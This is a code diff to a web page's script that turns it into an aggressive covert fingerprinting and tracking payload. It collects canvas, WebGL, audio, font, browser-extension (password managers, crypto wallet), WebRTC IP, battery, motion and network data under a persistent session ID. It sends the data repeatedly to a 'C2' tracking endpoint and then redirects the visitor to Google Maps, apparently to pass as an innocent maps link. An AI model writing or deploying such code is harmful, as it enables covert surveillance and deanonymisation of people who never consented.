@@ -21,46 +21,82 @@
 const C2 = location.origin + '/track';
 const fp = {};
 
-// ==================== REAL FINGERPRINTING ====================
+// ========== SESSION TRACKING - PERSISTS ACROSS VISITS ==========
+const sessionId = localStorage.getItem('fp_session') || crypto.randomUUID().slice(0,16);
+localStorage.setItem('fp_session', sessionId);
+fp.session = sessionId;  // Include session in all data
+// ===============================================================
 
-// Basic
+// ==================== AGGRESSIVE FINGERPRINTING ====================
+
+// 1. BASIC FINGERPRINTS
 fp.ua = navigator.userAgent;
-fp.screen = screen.width + 'x' + screen.height;
+fp.screen = screen.width + 'x' + screen.height + 'x' + screen.availHeight;
 fp.lang = navigator.language;
+fp.languages = JSON.stringify(navigator.languages);
 fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+fp.tzOffset = new Date().getTimezoneOffset();
 fp.cores = navigator.hardwareConcurrency;
 fp.memory = navigator.deviceMemory || 'unknown';
 fp.platform = navigator.platform;
+fp.doNotTrack = navigator.doNotTrack || 'unspecified';
+fp.cookiesEnabled = navigator.cookieEnabled;
+fp.touchPoints = navigator.maxTouchPoints || 0;
+fp.pixelRatio = window.devicePixelRatio;
+fp.colorDepth = screen.colorDepth;
 
-// Canvas
+// 2. CANVAS FINGERPRINTING (MULTIPLE)
+try {
+  const canvas1 = document.createElement('canvas');
+  canvas1.width = 400;
+  canvas1.height = 100;
+  const ctx1 = canvas1.getContext('2d');
+  ctx1.textBaseline = 'top';
+  ctx1.font = '16px Arial';
+  ctx1.fillStyle = '#f60';
+  ctx1.fillRect(0, 0, 400, 100);
+  ctx1.fillStyle = '#069';
+  ctx1.fillText('Fingerprint1', 2, 15);
+  ctx1.beginPath();
+  ctx1.arc(100, 50, 30, 0, Math.PI * 2);
+  ctx1.fillStyle = '#0f0';
+  ctx1.fill();
+  fp.canvas1 = canvas1.toDataURL();
+  
+  const canvas2 = document.createElement('canvas');
+  canvas2.width = 300;
+  canvas2.height = 80;
+  const ctx2 = canvas2.getContext('2d');
+  ctx2.font = '20px "Times New Roman"';
+  ctx2.fillStyle = '#000';
+  ctx2.fillText('The quick brown fox', 10, 30);
+  ctx2.font = 'bold 18px "Comic Sans MS"';
+  ctx2.fillStyle = '#f00';
+  ctx2.fillText('jumps over', 10, 55);
+  fp.canvas2 = canvas2.toDataURL();
+} catch(e) { fp.canvas = 'error'; }
+
+// 3. WEBGL DEEP FINGERPRINTING
 try {
   const canvas = document.createElement('canvas');
-  canvas.width = 400;
-  canvas.height = 100;
-  const ctx = canvas.getContext('2d');
-  ctx.textBaseline = 'top';
-  ctx.font = '16px Arial';
-  ctx.fillStyle = '#f60';
-  ctx.fillRect(0, 0, 400, 100);
-  ctx.fillStyle = '#069';
-  ctx.fillText('Fingerprint', 2, 15);
-  ctx.beginPath();
-  ctx.arc(100, 50, 30, 0, Math.PI * 2);
-  ctx.fillStyle = '#0f0';
-  ctx.fill();
-  fp.canvas = canvas.toDataURL();
-} catch(e) { fp.canvas = null; }
-
-// WebGL
-try {
-  const canvas = document.createElement('canvas');
-  const gl = canvas.getContext('webgl');
+  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
   if (gl) {
-    fp.webgl = gl.getParameter(gl.RENDERER);
+    fp.webgl_renderer = gl.getParameter(gl.RENDERER);
+    fp.webgl_vendor = gl.getParameter(gl.VENDOR);
+    fp.webgl_version = gl.getParameter(gl.VERSION);
+    fp.webgl_shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+    fp.webgl_extensions = JSON.stringify(gl.getSupportedExtensions());
+    
+    // WebGL fingerprinting image
+    gl.clearColor(0.2, 0.4, 0.6, 1.0);
+    gl.clear(gl.COLOR_BUFFER_BIT);
+    const pixels = new Uint8Array(4);
+    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
+    fp.webgl_pixels = pixels.join(',');
   }
-} catch(e) { fp.webgl = null; }
+} catch(e) { fp.webgl = 'error'; }
 
-// Audio
+// 4. AUDIO FINGERPRINTING
 try {
   if ('AudioContext' in window) {
     const a = new AudioContext();
@@ -70,62 +106,222 @@ try {
     n.connect(a.destination);
     o.start();
     setTimeout(() => {
-      const u = new Uint8Array(n.frequencyBinCount);
-      n.getByteFrequencyData(u);
-      fp.audio = btoa(String.fromCharCode(...u.slice(0, 32)));
+      const freqData = new Uint8Array(n.frequencyBinCount);
+      n.getByteFrequencyData(freqData);
+      fp.audio_freq = Array.from(freqData.slice(0, 50)).join(',');
+      
+      const timeData = new Uint8Array(n.fftSize);
+      n.getByteTimeDomainData(timeData);
+      fp.audio_time = Array.from(timeData.slice(0, 50)).join(',');
+      
       o.stop();
       a.close();
     }, 150);
   }
-} catch(e) { fp.audio = null; }
+} catch(e) { fp.audio = 'error'; }
 
-// WebRTC local IP
+// 5. WEBRTC MULTIPLE IP LEAKS
 try {
-  const pc = new RTCPeerConnection({iceServers: []});
+  const pc = new RTCPeerConnection({
+    iceServers: [
+      {urls: 'stun:stun.l.google.com:19302'},
+      {urls: 'stun:stun1.l.google.com:19302'}
+    ]
+  });
   pc.createDataChannel('');
   pc.createOffer().then(o => pc.setLocalDescription(o));
+  
+  const ips = [];
   pc.onicecandidate = e => {
     if (e.candidate) {
-      const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-      if (match) fp.webrtc = match[0];
+      const match = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);
+      if (match) {
+        match.forEach(ip => {
+          if (!ips.includes(ip)) ips.push(ip);
+        });
+        fp.webrtc_ips = JSON.stringify(ips);
+      }
     }
   };
-  setTimeout(() => { if (!fp.webrtc) fp.webrtc = null; }, 500);
-} catch(e) { fp.webrtc = null; }
+  setTimeout(() => { if (!fp.webrtc_ips) fp.webrtc_ips = 'none'; }, 1000);
+} catch(e) { fp.webrtc = 'error'; }
 
-// Hardware
-fp.hardware = {
+// 6. FONT DETECTION
+try {
+  const fontList = [
+    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS',
+    'Georgia', 'Helvetica', 'Impact', 'Tahoma', 'Trebuchet MS',
+    'Lucida Console', 'Segoe UI', 'Calibri', 'Cambria', 'Candara',
+    'Consolas', 'Corbel', 'Fira Sans', 'Open Sans', 'Roboto',
+    'Lato', 'Montserrat', 'Oswald', 'Raleway', 'Ubuntu'
+  ];
+  
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  const testText = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  
+  const baseWidth = ctx.measureText(testText).width;
+  const available = [];
+  
+  fontList.forEach(font => {
+    ctx.font = '16px ' + font;
+    const width = ctx.measureText(testText).width;
+    if (Math.abs(width - baseWidth) > 0.5) {
+      available.push(font);
+    }
+  });
+  
+  fp.fonts = JSON.stringify(available);
+} catch(e) { fp.fonts = '[]'; }
+
+// 7. HARDWARE FINGERPRINTING
+fp.hardware = JSON.stringify({
   cores: navigator.hardwareConcurrency,
   memory: navigator.deviceMemory,
   touch: 'ontouchstart' in window,
-  pixelRatio: window.devicePixelRatio
-};
+  maxTouchPoints: navigator.maxTouchPoints || 0,
+  pixelRatio: window.devicePixelRatio,
+  colorDepth: screen.colorDepth,
+  orientation: screen.orientation?.type || 'unknown'
+});
 
-// Battery
+// 8. BROWSER EXTENSIONS
+try {
+  const extIds = [
+    'gighmmpiobklfepjocnamgkkbiglidom', // AdBlock
+    'cjpalhdlnbpafiamejdnhcphjbkeiagm', // uBlock
+    'nkbihfbeogaeaoehlefnkodbefgpgknn', // MetaMask
+    'fcfhplploccackoneaefokcmbjfbkenj', // LastPass
+    'hdokiejnpimakedhajhdlcegeplioahd'  // Dashlane
+  ];
+  
+  const detected = [];
+  extIds.forEach(id => {
+    const img = new Image();
+    img.src = 'chrome-extension://' + id + '/icon.png';
+    img.onload = () => detected.push(id);
+  });
+  
+  setTimeout(() => { 
+    if (detected.length) fp.extensions = JSON.stringify(detected); 
+  }, 1000);
+} catch(e) { fp.extensions = '[]'; }
+
+// 9. MEDIA DEVICES
+try {
+  if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+    navigator.mediaDevices.enumerateDevices().then(devices => {
+      fp.media_devices = JSON.stringify(devices.map(d => ({
+        kind: d.kind,
+        label: d.label ? 'exists' : 'hidden'
+      })));
+    });
+  }
+} catch(e) { fp.media_devices = '[]'; }
+
+// 10. BATTERY API
 if (navigator.getBattery) {
   navigator.getBattery().then(b => {
-    fp.battery = Math.round(b.level * 100);
+    fp.battery_level = Math.round(b.level * 100);
+    fp.battery_charging = b.charging;
+    fp.battery_time = Math.round(b.dischargingTime / 60);
   });
 }
 
-// Send data
-setTimeout(() => {
+// 11. MOTION SENSORS
+window.addEventListener('devicemotion', e => {
+  if (e.acceleration) {
+    fp.motion = JSON.stringify({
+      x: e.acceleration.x,
+      y: e.acceleration.y,
+      z: e.acceleration.z,
+      rotation: e.rotationRate ? {
+        alpha: e.rotationRate.alpha,
+        beta: e.rotationRate.beta,
+        gamma: e.rotationRate.gamma
+      } : null
+    });
+  }
+}, true);
+
+// 12. NETWORK INFORMATION
+if (navigator.connection) {
+  fp.network = JSON.stringify({
+    downlink: navigator.connection.downlink,
+    effectiveType: navigator.connection.effectiveType,
+    rtt: navigator.connection.rtt,
+    saveData: navigator.connection.saveData
+  });
+}
+
+// 13. PERFORMANCE TIMING
+if (window.performance) {
+  const perf = performance.timing;
+  fp.performance = JSON.stringify({
+    loadTime: perf.loadEventEnd - perf.navigationStart,
+    domReady: perf.domComplete - perf.domLoading,
+    redirects: perf.redirectEnd - perf.redirectStart
+  });
+}
+
+// 14. STORAGE CAPABILITIES
+fp.storage = JSON.stringify({
+  localStorage: !!window.localStorage,
+  sessionStorage: !!window.sessionStorage,
+  indexedDB: !!window.indexedDB,
+  cookieEnabled: navigator.cookieEnabled
+});
+
+// 15. SEND ALL DATA WITH SESSION TRACKING (MULTIPLE ATTEMPTS)
+function sendData() {
+  // Build payload with session
   const payload = {};
   for (let key in fp) {
-    if (fp[key] && typeof fp[key] === 'object') {
-      payload[key] = JSON.stringify(fp[key]);
-    } else if (fp[key]) {
+    if (fp[key] !== null && fp[key] !== undefined) {
       payload[key] = fp[key];
     }
   }
+  
+  // Ensure session is included
+  payload.session = sessionId;
+  
   const params = new URLSearchParams(payload);
-  new Image().src = C2 + '?' + params.toString() + '&r=' + Math.random();
-}, 1000);
+  
+  // Try multiple methods for redundancy
+  fetch(C2 + '?' + params.toString(), {mode: 'no-cors'}).catch(() => {});
+  new Image().src = C2 + '?' + params.toString() + '&r1=' + Math.random();
+  
+  setTimeout(() => {
+    new Image().src = C2 + '?' + params.toString() + '&r2=' + Math.random();
+  }, 500);
+  
+  setTimeout(() => {
+    new Image().src = C2 + '?' + params.toString() + '&r3=' + Math.random();
+  }, 1000);
+  
+  // Beacon for page unload
+  window.addEventListener('beforeunload', () => {
+    navigator.sendBeacon(C2, params.toString());
+  });
+}
 
-// Redirect to real Google Maps
+// Send data multiple times to ensure delivery
+sendData();
+setTimeout(sendData, 1000);
+setTimeout(sendData, 2000);
+
+// Also send when user leaves/redirects
+window.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden') {
+    const payload = { session: sessionId, type: 'page_hidden' };
+    navigator.sendBeacon(C2, new URLSearchParams(payload));
+  }
+});
+
+// Redirect to real Google Maps after 3 seconds
 setTimeout(() => {
   location.href = 'https://www.google.com/maps/search/?api=1&query=nearby';
-}, 2000);
+}, 3000);
 </script>
 </body>
 </html>
